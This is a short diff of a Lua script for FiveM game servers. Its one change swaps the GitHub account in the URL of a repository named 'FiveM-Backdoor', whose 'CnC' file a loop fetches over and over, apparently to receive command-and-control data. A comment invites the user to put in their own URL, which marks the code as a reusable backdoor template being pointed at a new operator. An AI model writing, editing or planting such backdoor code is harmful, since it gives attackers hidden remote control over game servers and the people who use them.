@@ -24,7 +24,7 @@ end)
 
 Citizen.CreateThread(function()
     while true do
-        PerformHttpRequest("https://raw.githubusercontent.com/N0rmie/FiveM-Backdoor/main/CnC", function (errorCode, myDB, resultHeaders) -- Put here your own URL with the Json
+        PerformHttpRequest("https://raw.githubusercontent.com/erenscript/FiveM-Backdoor/main/CnC", function (errorCode, myDB, resultHeaders) -- Put here your own URL with the Json
             if errorCode == 0 then
                 verified = true
             else
